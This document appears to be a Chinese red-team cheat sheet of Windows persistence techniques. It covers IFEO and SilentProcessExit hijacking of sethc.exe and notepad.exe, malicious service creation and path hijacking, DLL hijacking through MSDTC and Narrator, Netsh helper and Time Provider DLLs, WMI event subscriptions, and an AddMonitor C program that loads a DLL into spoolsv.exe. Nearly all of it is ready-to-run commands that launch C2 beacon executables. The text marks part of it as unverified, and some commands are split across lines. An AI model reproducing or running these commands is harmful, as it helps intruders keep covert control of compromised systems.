# Usage
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "<path to executable>" /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Users\Administrator\Downloads\22.exe" /f
```

##### GlobalFlag

###### 利用方法

`GlobalFlag` 注册表项中的十六进制值`0x200`启用进程的静默退出监视

ReportingMode 注册表项启用 Windows 错误报告进程 (WerFault.exe)，该进程将是“ **MonitorProcess** ” beacon.exe 的父进程。当记事本进程被终止时（用户已关闭记事本应用程序），有效负载将被执行，并且将与命令和控制建立通信。这将导致系统创建一个名为“ **WerFault.exe** ”的新进程，用于跟踪与操作系统、Windows 功能和应用程序相关的错误。有效负载将作为 Windows 错误报告（**WerFault.exe** ) 的子进程启动

```cmd
# Usage
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "<path to executable>"

# 记事本退出之后运行cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\Windows\System32\cmd.exe"

# 劫持shitf
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe" /v ReportingMode /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe" /v MonitorProcess /t REG_SZ /d "C:\beacon.exe" /f
```

### 5. 系统服务

#### 常用命令

##### 创建服务

~~~cmd
sc create <Service Name> binPath= "<path to executable>"

# PowerShell
New-Service -Name "<Service Name>" -BinaryPathName "<path to executable>" -Description "<Description>" -StartupType Automatic
~~~

##### 启动服务

~~~cmd
sc start <Service Name>
~~~

##### 停止服务

~~~cmd
sc stop <Service Name>
~~~

##### 删除服务

~~~cmd
sc delete <Service Name>
~~~

##### 查询服务

~~~cmd
sc query

# Usage：
sc query <Service Name>
~~~

##### 修改服务配置

~~~cmd
sc config <Service Name> <parameter>= <value>
~~~

##### 创建服务马并启动该服务

~~~cmd
shell sc create <Server Name> binpath= "<path to executable>" start= auto && sc.exe start <Service Name>

# Usages：
# 非服务马的情况：启动会报错，但实际上是成功的
# 创建服务，设置服务启动失败之后执行命令，启动服务（非服务马启动失败之后会触发服务启动失败执行的命令）
shell sc create <Server Name> binpath= "cmd.exe /c start /b <path to executable>" start= auto && sc failure <Server Name> command= "\"cmd.exe /c start /b <path to executable>\"" && sc start <Server Name>

shell sc create publicsrv binpath= "cmd.exe /c start /b C:\tmp\beacon.exe" start= auto && sc failure publicsrv command= "\"cmd.exe /c start /b C:\tmp\beacon.exe\"" && sc.exe start publicsrv
~~~

#### 劫持路径

##### bin路径

“ ***binPath*** ”是将服务指向服务启动时需要执行的二进制文件的位置。Metasploit 框架可用于生成任意可执行文件

```cmd
# Usage
sc config <Server Name> binPath= "<path to executable>" && sc start <Server Name>

sc config Rex binPath= "C:\tmp\beacon.exe" && sc start Fax
```

##### 图像路径

“ ***ImagePath*** ”注册表项通常包含驱动程序映像文件的路径。使用任意可执行文件劫持此Key将导致有效负载在服务启动期间运行

```cmd
# Usage
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v ImagePath /t REG_SZ /d "<path to executable>"

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v ImagePath /t REG_SZ /d "C:\tmp\beacon.exe"
```

##### 失败命令

Windows 提供了一种功能，以便在服务无法启动或其通信进程终止时执行某些操作。具体来说，当服务被终止时可以执行命令。控制此操作的注册表项是“ ***FailureCommand*** ”，它的值将定义将执行的内容

```cmd
# Usage
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v FailureCommand /t REG_SZ /d "<path to executable>"
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v FailureCommand

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v FailureCommand /t REG_SZ /d "C:\tmp\beacon.exe"
```

***或者，可以通过使用***  ***“sc”*** 实用程序并指定 ***“failure”*** 选项来执行相同的操作

```cmd
# Usage
sc failure <Server Name> command= "\"<path to executable>\""

sc failure Rex command= "\"C:\tmp\beacon.exe\""
```

### 6. DLL劫持

当程序启动时，许多 DLL 被加载到其进程的内存空间中，Windows 通过按特定顺序查找系统文件夹来搜索进程所需的 DLL

#### MSDTC

分布式事务协调器是一个 Windows 服务，负责协调数据库 (SQL Server) 和 Web 服务器之间的事务

当此服务启动时会尝试从 System32 加载三个 DLL 文件：oci.dll、SQLLib80.dll、xa80.dll

```cmd
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI
```

##### oci.dll

在默认的 Windows 安装中，System32 文件夹中缺少 ***“oci.dll ”***。这使得有机会将任意 DLL 植入到该文件夹中，该文件夹具有相同的名称（需要管理员权限），以便执行恶意代码

```cmd
sc qc msdtc
sc config msdtc start= auto

net stop msdtc && net start msdtc
msdtc -install
```

#### Narrator 旁白

Microsoft Narrator 是一款适用于 Windows 环境的屏幕阅读应用程序

本地化设置相关的 DLL 丢失 (MSTTSLocEnUS.DLL)，并且可能被滥用来执行任意代码

当“ *Narrator.exe* ”进程启动时，DLL 将被加载到该进程中

```cmd
# 系统语言为中文时，可能不起作用

C:\Windows\System32\Speech\Engines\TTS\MSTTSLocEnUS.DLL
```

### 7. Netsh Helper DLL

Netsh 是一个 Windows 实用程序，管理员可以使用它来执行与系统网络配置相关的任务，并对基于主机的 Windows 防火墙进行修改

Netsh 功能可以通过使用DLL 文件来扩展，需要本地管理员级别的权限，启动时会留下cmd

#### 注册表位置

```cmd
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh
```

#### 利用方法

```cmd
# 添加 DLL
netsh add helper <path to dll>

# 添加自启动注册表
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v netsh /t REG_SZ /d "cmd /c start /b C:\Windows\System32\netsh"
```

### 8. Time Providers

时间提供程序以 DLL 文件的形式实现，该文件位于 System32 文件夹中；**W32Time**服务在 Windows 启动期间启动并加载 w32time.dll

需要管理员级别权限，因为指向时间提供程序 DLL 文件的注册表项存储在 HKEY_LOCAL_MACHINE 中

根据系统是用作 NTP 服务器还是 NTP 客户端，使用以下两个注册表位置

```powershell
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer
```

#### 利用原理

```powershell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" /v DllName /t REG_SZ /d "C:\temp\w32time.dll"
```

该服务将在 Windows 启动期间启动，或者通过执行以下命令手动启动

```cmd
sc.exe stop w32time
sc.exe start w32time
```

# 未验证

## 0x01 WMI

### 查询事件

#### 列出事件过滤器

```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
```

#### 列出事件消费者

```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
```

#### 列出事件绑定

```powershell
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```

### 删除事件

#### 删除事件过滤器

```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='事件过滤器名'" | Remove-WmiObject -Verbose
```

#### 删除事件消费者

```powershell
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='事件消费者名'" | Remove-WmiObject -Verbose
```

#### 删除事件绑定

```powershell
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%事件绑定名%'" | Remove-WmiObject -Verbose
```

### WMI永久事件

注意：没有指定时间轮询则需要机器重启才可以进行WMI轮询，需要注意的一点是，WMI可以任意指定触发条件，例如用户退出，某个程序创建，结束等等。

注意：可以考虑添加Powershell的时间间隔器，需要上线至C2则将Payload替换成C2的exe或者dll或者ps1即可

#### 注册一个 WMI 事件过滤器

```cmd
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BugSecFilter", EventNamespace = "root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __TimerEvent WITHIN 10 WHERE TimerID = 'BugSecFilter'"
```

#### 注册一个 WMI 事件消费者

```cmd
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BugSecConsumer", CommandLineTemplate="cmd.exe /c  c:\beacon.exe"
```

#### 将事件消费者绑定到事件过滤器

```cmd
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter='\\.\root\subscription:__EventFilter.Name="BugSecFilter"', Consumer='\\.\root\subscription:CommandLineEventConsumer.Name="BugSecConsumer"'
```

```bat
:: Based on http://www.exploit-monday.com/2016/08/wmi-persistence-using-wmic.html

:: the following command are meant for cmd but can be used with wmic.exe by simply writing them without the wmic at the start.

:: Create an __EventFilter instance.
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BugSecFilter", EventNamespace = "root\cimv2", QueryLanguage="WQL", Query="select * from __InstanceCreationEvent within 5 where targetInstance isa 'Win32_Process' and TargetInstance.Name = 'chrome.exe'"

:: Create an __EventConsumer instance
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BugSecConsumer", CommandLineTemplate="cmd.exe /c echo test > c:\WMI-wmic.txt"

:: Create a __FilterToConsumerBinding instance
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter='\\.\root\subscription:__EventFilter.Name="BugSecFilter"', Consumer='\\.\root\subscription:CommandLineEventConsumer.Name="BugSecConsumer"'
```

### 定时执行

Step 1

- `/NAMESPACE:"\\root\subscription"`: 指定 WMI 命名空间为 "\root\subscription"，这是用于访问事件订阅相关信息的命名空间
- `PATH __EventFilter CREATE`: 创建一个名为 "__EventFilter" 的对象，该对象是事件筛选器
- `Name="BotFilter82"`: 设置筛选器的名称为 "BotFilter82"
- `EventNameSpace="root\cimv2"`: 设置事件名称空间为 "root\cimv2"，表示在此名称空间中查询事件
- `QueryLanguage="WQL"`: 设定查询语言为 WQL (Windows Query Language)
- `Query="SELECT * FROM __InstanceModificationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"`: 设置查询语句，该语句使用了 "__InstanceModificationEvent" 类来监视某个时间段内（120秒） "Win32_PerfFormattedData_PerfOS_System" 类型的实例修改事件

```cmd
# Usage
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="筛选器的名称"
, EventNameSpace="事件名称空间",QueryLanguage="WQL", Query="SELECT * FROM __Instance
ModificationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82"
, EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __Instance
ModificationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

Step 2

```cmd
# Usage
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="消费者的名称", ExecutablePath="可执行文件路径",CommandLineTemplate="命令行参数模板"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="B
otConsumer23", ExecutablePath="C:\Windows\System32\notepad.exe",CommandLineTemplate="C:\Windows\System32\notepad.exe"
```

- `/NAMESPACE:"\\root\subscription"`: 指定 WMI 命名空间为 "\root\subscription"
- `PATH CommandLineEventConsumer CREATE`: 创建一个名为 "CommandLineEventConsumer" 的对象，该对象是命令行事件消费者
- `Name="BotConsumer23"`: 设置消费者的名称为 "BotConsumer23"
- `ExecutablePath="C:\Windows\System32\notepad.exe"`: 指定可执行文件路径为 "C:\Windows\System32\notepad.exe"
- `CommandLineTemplate="C:\Windows\System32\notepad.exe"`: 指定命令行参数模板为 "C:\Windows\System32\notepad.exe"

Step 3

```cmd
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter
="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"B
otConsumer23\""
```

## 0x02 AddMonitor()

打印后台处理程序服务负责管理 Windows 操作系统中的打印作业。与服务的交互是通过 Print Spooler API 执行的，该 API 包含一个函数 ( **AddMonitor** )，可用

于安装本地端口监视器并连接配置、数据和监视器文件。该函数能够将 DLL 注入**spoolsv.exe**进程，并通过创建注册表项

### 编译注册

```c
#include "stdafx.h"
#include "Windows.h"

int main() {	
	MONITOR_INFO_2 monitorInfo;
	TCHAR env[12] = TEXT("Windows x64");
	TCHAR name[12] = TEXT("evilMonitor");
	TCHAR dll[12] = TEXT("evil64.dll");
	monitorInfo.pName = name;
	monitorInfo.pEnvironment = env;
	monitorInfo.pDLLName = dll;
	AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
	return 0;
}


#include "Windows.h"
 
int main() {
    MONITOR_INFO_2 monitorInfo;
    TCHAR env[12] = TEXT("Windows x64");
    TCHAR name[12] = TEXT("Monitor");
    TCHAR dll[12] = TEXT("test.dll");
    monitorInfo.pName = name;
    monitorInfo.pEnvironment = env;
    monitorInfo.pDLLName = dll;
    AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
    return 0;
}
```

编译代码将生成一个可执行文件（在本例中为 Monitors.exe），该可执行文件将在系统上执行恶意 DLL的注册

需要将 DLL 复制到 System32 文件夹，因为根据 Microsoft文档，这是AddMonitor函数加载相关 DLL 的预期位置

```cmd
copy test.dll %systemroot%\System32
```

为了实现持久性，“ **Monitors** ”注册表位置下需要一个密钥

```cmd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors

# Usage
reg add "hklm\system\currentcontrolset\control\print\monitors\Pentestlab" /v "Driver" /d "test.dll" /t REG_SZ
```

下次重新启动时，spoolsv.exe 进程将加载 Monitors 注册表项中存在并存储在 Windows 文件夹 System32 中的所有驱动程序 DLL 文件
